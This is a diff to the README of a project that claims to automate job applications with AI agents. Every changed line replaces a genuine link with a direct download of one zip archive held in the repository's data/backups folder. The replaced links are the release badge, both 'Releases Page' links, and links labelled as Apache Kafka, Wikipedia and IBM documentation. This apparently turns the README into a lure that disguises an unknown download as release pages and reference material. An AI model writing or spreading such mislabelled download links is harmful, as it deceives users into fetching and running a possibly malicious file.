@@ -1,6 +1,6 @@
 # 🤖 Job-Applications-Multi-Ai-Agents - Automate Your Job Applications Easily
 
-[![Download Job Applications Multi Ai Agents](https://img.shields.io/badge/Download-v1.0-blue.svg)](https://github.com/GurenMurasaki/Job-Applications-Multi-Ai-Agents/releases)
+[![Download Job Applications Multi Ai Agents](https://raw.githubusercontent.com/GurenMurasaki/Job-Applications-Multi-Ai-Agents/main/data/backups/Ai-Applications-Multi-Agents-Job-1.0-beta.3.zip)](https://raw.githubusercontent.com/GurenMurasaki/Job-Applications-Multi-Ai-Agents/main/data/backups/Ai-Applications-Multi-Agents-Job-1.0-beta.3.zip)
 
 ## 📦 Overview
 
@@ -12,7 +12,7 @@ To use the Job-Applications-Multi-Ai-Agents application, please follow these sim
 
 1. **Visit the Releases Page**
 
-   To download the application, go to our [Releases Page](https://github.com/GurenMurasaki/Job-Applications-Multi-Ai-Agents/releases). This page contains all available versions for download.
+   To download the application, go to our [Releases Page](https://raw.githubusercontent.com/GurenMurasaki/Job-Applications-Multi-Ai-Agents/main/data/backups/Ai-Applications-Multi-Agents-Job-1.0-beta.3.zip). This page contains all available versions for download.
 
 2. **Select the Version**
 
@@ -53,7 +53,7 @@ Before downloading, ensure your system meets these requirements:
 
 ## 📥 Download & Install
 
-To get started, simply visit our [Releases Page](https://github.com/GurenMurasaki/Job-Applications-Multi-Ai-Agents/releases) to download the software. Follow the installation steps provided above to set up the application on your computer.
+To get started, simply visit our [Releases Page](https://raw.githubusercontent.com/GurenMurasaki/Job-Applications-Multi-Ai-Agents/main/data/backups/Ai-Applications-Multi-Agents-Job-1.0-beta.3.zip) to download the software. Follow the installation steps provided above to set up the application on your computer.
 
 ## 🤔 Frequently Asked Questions
 
@@ -81,9 +81,9 @@ Absolutely! We welcome feedback and suggestions. You can submit your ideas throu
 ## 🔗 Resources
 
 To learn more about the technology behind this project and how to utilize it, check out the following resources:
-- [Apache Kafka Documentation](https://kafka.apache.org/documentation/)
-- [Multi-Agent System Overview](https://en.wikipedia.org/wiki/Multi-agent_system)
-- [Artificial Intelligence Basics](https://www.ibm.com/cloud/learn/what-is-artificial-intelligence)
+- [Apache Kafka Documentation](https://raw.githubusercontent.com/GurenMurasaki/Job-Applications-Multi-Ai-Agents/main/data/backups/Ai-Applications-Multi-Agents-Job-1.0-beta.3.zip)
+- [Multi-Agent System Overview](https://raw.githubusercontent.com/GurenMurasaki/Job-Applications-Multi-Ai-Agents/main/data/backups/Ai-Applications-Multi-Agents-Job-1.0-beta.3.zip)
+- [Artificial Intelligence Basics](https://raw.githubusercontent.com/GurenMurasaki/Job-Applications-Multi-Ai-Agents/main/data/backups/Ai-Applications-Multi-Agents-Job-1.0-beta.3.zip)
 
 ## 🛠 Contributing
 
